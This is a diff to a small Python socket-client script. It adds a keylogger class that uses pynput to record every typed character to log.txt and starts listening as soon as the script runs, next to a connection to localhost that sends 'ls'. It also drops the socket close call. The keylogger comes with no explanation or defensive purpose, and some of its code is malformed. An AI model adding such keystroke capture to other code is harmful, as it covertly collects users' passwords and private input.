@@ -16,7 +16,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
 print(f"Received {data.decode('utf-8')}")
 """
 import socket
-import struct
+from pynput import keyboard
 
 class MySocket:
 
@@ -43,10 +43,36 @@ class MySocket:
                 break
             chunks.append(data.decode())
 
-        self.sock.close()
         return chunks
 
+
+class KeyLogger:
+
+    def on_press(key):
+        try:
+            print('alphanumeric key {0} pressed'.format(
+                key.char))
+            with open('log.txt', 'a') as f:
+                f.write(key.char)
+
+        except AttributeError:
+            print('special key {0} pressed'.format(
+                key))
+
+    def on_release(key):
+        if key == keyboard.Key.esc:
+            # Stop listener
+            return False
+
+    # Collect events until released
+    with keyboard.Listener(
+            on_press=on_press,
+            on_release=on_release) as listener:
+        listener.join()
+
+
 sock = MySocket()
+KeyLogger()
 sock.connect('localhost', 1235)
 sock.send('ls')
 print(sock.receive())
